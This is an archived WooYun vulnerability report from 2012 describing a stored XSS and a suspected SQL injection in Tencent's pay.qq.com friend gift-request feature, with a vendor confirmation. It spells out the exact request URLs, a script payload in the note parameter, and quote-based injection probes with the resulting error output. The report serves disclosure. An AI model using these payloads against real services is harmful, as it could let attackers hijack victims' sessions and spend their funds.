@@ -1,0 +1,234 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯向好友索要功能xss+疑似SQL注射。  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯向好友索要功能xss+疑似SQL注射。  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Jannock">Jannock</a> 
+</li><li>提交时间：		2012-10-26 16:23</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-11-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-15：	细节向普通白帽子公开<br/>
+									2012-11-25：	细节向实习白帽子公开<br/>
+									2012-12-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">腾讯向好友索要功能xss，提交索要，点击后直接通过xss和上下文环境功能即可获得他人QB<br />
+另外提交索要处疑似SQL注射。<br />
+pay.qq.com 域名哦。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://pay.qq.com/service/ask_v2.shtml?sid=1&amp;cm=bank&amp;aid=vip.pingtai.pay.index.qqvip<br />
+<br />
+向好友索要功能<br />
+<br />
+</p><p class="detail"><a href="../images/2615362633b9e655239a877d093b1cd77759c8dc.jpg" target="_blank"><img src="../images/2615362633b9e655239a877d093b1cd77759c8dc.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+当然不能像上图直接提交，因为js会被过滤，而是通过下面链接提交<br />
+<br />
+<br />
+<br />
+http://pay.qq.com/cgi-bin/askforgift/payask.cgi?outputjson=true&amp;service_type=LTMCLUB&amp;note=&lt;script defer&gt;alert(1);send.formCheck(0);&lt;/script&gt;&amp;uin=自己的Q号&amp;month=3&amp;askeduin=好友的Q号<br />
+<br />
+</p><p class="detail"><a href="../images/261539559ae29fdcfa352084de7d98e5bb648590.jpg" target="_blank"><img src="../images/261539559ae29fdcfa352084de7d98e5bb648590.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+当好友收到请求后，点击链接，即<br />
+<br />
+</p><p class="detail"><a href="../images/26154149bec44c2805d7bcab5a961526e193ac19.jpg" target="_blank"><img src="../images/26154149bec44c2805d7bcab5a961526e193ac19.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/261541574bb4248a09462c8cd47da08c7fa6a866.jpg" target="_blank"><img src="../images/261541574bb4248a09462c8cd47da08c7fa6a866.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我们看看原因<br />
+<br />
+请处理以下索要信息： 页面中通过ajax请求获取索要的信息，然后通过 innerHTML形式设置内容，看下两图<br />
+<br />
+</p><p class="detail"><a href="../images/261547198873fa7a2718d9a3c9d0c28b8ec4bd81.jpg" target="_blank"><img src="../images/261547198873fa7a2718d9a3c9d0c28b8ec4bd81.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/26154726895881abcf37a47c8d68569427562b4f.jpg" target="_blank"><img src="../images/26154726895881abcf37a47c8d68569427562b4f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+由于显示信息页面没有处理好编码，因此造成漏洞。。<br />
+<br />
+不过测试过程中发现，程序中过虑了 \ = 等，因此上述方式只能用于 IE 和 chrome 。其它浏览器需要绕过过滤执行js暂没研究。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+疑似注入地址也是这个索要请求的地址<br />
+<br />
+http://pay.qq.com/cgi-bin/askforgift/payask.cgi?outputjson=true&amp;service_type=LTMCLUB&amp;note=x&#039;&amp;uin=自己的Q号&amp;month=3&amp;askeduin=好友的Q号<br />
+<br />
+当存在 &#039; 时，返回出错<br />
+<br />
+{ &quot;resultcode&quot;: 20052, &quot;resultinfo&quot;: &quot;对不起，系统忙，请稍后再试。&quot; }<br />
+<br />
+<br />
+<br />
+初步猜是 insert 型注入点。。<br />
+<br />
+可以试试<br />
+<br />
+http://pay.qq.com/cgi-bin/askforgift/payask.cgi?outputjson=true&amp;service_type=LTMCLUB&amp;note=x&#039;&#039;&amp;uin=自己的Q号&amp;month=3&amp;askeduin=好友的Q号<br />
+<br />
+发送成功<br />
+<br />
+而看到请求的信息中，<br />
+<br />
+好友留言：<br />
+<br />
+x&#039;<br />
+<br />
+即证明了这个注入点的存在。。<br />
+<br />
+你们自己看吧。。。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">上面说得很详细了，因为涉及到金钱，不便测试。。。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们比我懂！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Jannock" title="Jannock">Jannock</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013916" title="腾讯向好友索要功能xss+疑似SQL注射。">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2012-10-26 17:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。我们会马上安排专人跟进确认处理，有新的情况会及时同步</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13916";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
